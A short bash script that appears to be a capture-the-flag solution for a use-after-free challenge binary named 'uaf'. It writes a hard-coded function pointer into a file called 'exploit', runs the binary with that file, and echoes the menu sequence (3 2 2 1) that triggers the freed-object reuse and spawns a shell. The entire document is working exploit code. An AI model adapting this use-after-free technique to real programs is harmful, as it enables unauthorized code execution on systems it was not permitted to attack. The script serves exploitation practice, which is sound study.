#!/bin/bash

# this used to generate exploit (pointer to execute the shell)
python -c "print '\x48\x15\x40\x00'" > exploit

echo "[+] Generating payload"
echo "[+] Program UAF should run now"
echo "[+] To execute shell, in the menu, you're only allowed to enter value 4 times. The sequence are: 3 2 2 1"

./uaf 3 ./exploit
